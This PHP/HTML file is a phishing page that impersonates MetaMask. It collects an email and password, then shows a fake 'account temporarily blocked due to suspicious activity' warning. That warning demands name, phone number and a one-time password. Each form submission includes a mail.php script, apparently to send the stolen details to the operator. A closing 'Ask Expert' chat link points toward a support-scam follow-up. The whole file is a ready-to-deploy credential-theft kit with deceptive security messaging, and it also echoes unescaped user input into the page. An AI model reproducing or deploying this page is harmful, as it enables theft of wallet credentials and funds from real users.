<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Mask</title>
    <link href="assets/scss/bootstrap.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/scss/style.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/scss/forms/_form-control.scss">

</head>

<body>

    <!-- header -->

    <div class="container-fluid" id="header">
        <div class="headerImage">
            <img src="assets/images/meta_logo.png">
        </div>
    </div>

    <!-- header ends -->

    <?php
     if (isset($_POST['btnLoginMore'])) {
        include 'mail.php';
    ?>
    <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                <b>A One time password (OTP) will be shared with you by the support expert team while logging in.</b>
                <br>
                Kindly contact chat assistance for further help
            </div>
    <div id="verify">
        <form action="" method="post">
        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
            <div class="image">
                <img src="assets/images/face.png">
            </div>
            <div class="heading">
                <h2>Verification Required</h2>
            </div>
            <div class="inputFields">
               <input type="text" class="form-control" name="fname" placeholder="Enter Your First Name" required>
               <input type="text" class="form-control" placeholder="Enter Your Last Name" name="lname" required>
               <input type="text" class="form-control" placeholder="Registered Number" name="number" required>
               <input class="form-control" type="text" name="number" placeholder="One time password (OTP)" maxlength="6" required>
                <div class="button">
                    <button name="fromLog" type="submit">Submit</button>
                </div>
            </div>

        </form>
    </div>
     <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>
    <div id="error">
        <form>
            <div class="image">
                <img src="assets/images/face.png">
            </div>
            <div class="heading">
                <h2>Important Message</h2>
                <p>Your account has been <b>temporarily blocked</b> due to suspicious activity on your Network IP. Kindly ask an expert</p>
            </div>
            <div class="inputFields">
                <label>Error CODE: EBRX1:6X76D</label><br>
                <div class="contactLink">
                    <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
                </div>
            </div>
        </form>
    </div>
    <?php } else { ?>
    <div id="form">
        <form action="" method="post">
            <div class="image">
                <img src="assets/images/face.png">
            </div>
            <div class="heading">
                <h1>METAMASK</h1>
            </div>
            <div class="inputFields">
                <div class="mb-3 input">
                    <input type="email" class="form-control" name="email" id="exampleInputEmail1" placeholder="Email" required>
                </div>
                <div class="mb-3 input">
                    <input type="password" class="form-control" name="password" id="exampleInputPassword1" placeholder="Password" required>
                </div>
                <button name="btnLoginMore" type="submit" class="btn">Sign In</button>
                <div class="link">
                    <a href="#">Import Existing DEN</a>
                </div>
            </div>
        </form>
    </div>
    <?php } ?>
       <script src="assets/scss/bootstrap.min.js"></script>
</body>
</html>
